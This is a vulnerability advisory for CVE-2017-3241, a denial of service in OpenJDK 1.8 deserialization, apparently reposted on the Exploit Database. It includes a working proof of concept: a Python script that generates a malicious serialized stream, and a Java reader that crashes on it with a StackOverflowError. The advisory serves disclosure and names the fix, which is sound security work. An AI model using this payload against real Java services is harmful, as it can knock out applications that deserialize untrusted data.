Risk: High

Advisory URL:
https://erpscan.com/advisories/erpscan-17-006-oracle-openjdk-java-serialization-dos-vulnerability/

Date published: 17.01.2017

Vendor contacted: Oracle

2. VULNERABILITY INFORMATION

Class: Denial of Service

Remotely Exploitable: Yes

Locally Exploitable: Yes

CVE Name: CVE-2017-3241

CVSS Base Score: 9.0

3. VULNERABILITY DESCRIPTION

An attacker can cause DoS of the application which uses OpenJDK Runtime
Environment 1.8 as its core runtime engine.

4. VULNERABLE PACKAGES

OpenJDK Runtime Environment build 1.8.0_112-b15

5. SOLUTIONS AND WORKAROUNDS

Fix ObjectInputStream.skipCustomData() method, namely readObject0(false);
call in switch statement

Adress Oracle CPU January 2017

7. TECHNICAL DESCRIPTION

An attacker can craft a malicious sequence of bytes that will cause JVM
StackOverflowError in the standard Java deserialization process if it uses
ObjectInputStream.readObject() method.

7.1. Proof of Concept

An attacker creates a malicious sequence of bytes, for example, using this
python script pwn_ser.py:

'''
#!/usr/bin/env python2

import sys

exp = ""

#serialization header

exp += '\xac\xed\x00\x05'

exp1 = ''

exp1 += '\x72'

exp1 += '\x00\x0c'+'java.io.File'

exp1 += '\x41'*8

exp1 += '\x00'

exp1 += '\x00\x00'

exp += exp1 * 10000

sys.stdout.write(exp)

'''
and save it in exp2.ser file

$ ./pwn_ser2.py > exp2.ser

Let's simulate deserialization process. For this purpose, we create a
simple Java program, which uses the following standard deserialization
pattern:

Serialize_read.java

import java.io.FileInputStream;

import java.io.ObjectInputStream;

public class Serialize_read {

public static void main(String args[]) throws Exception {

  if(args.length < 1) {

      System.out.println("usage: "+Serialize_read.class.getSimpleName()+"
[file]");

      System.exit(-1);

  }

  FileInputStream fin = new FileInputStream(args[0]);

  ObjectInputStream oin = new ObjectInputStream(fin);

  try {

    Object objFromDisk = oin.readObject();

    String s = (String)objFromDisk;

    System.out.println(s);

    System.out.println("Successfully read!");

  }catch(Exception e){}

  System.exit(0);

}

}

Let's try to read our malicious file (we can also simulate this stuff over
network communication):

$ javac Serialize_read.java

$ java Serialize_read exp2.ser

It causes the following error dump:

Exception in thread "main" java.lang.StackOverflowError

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
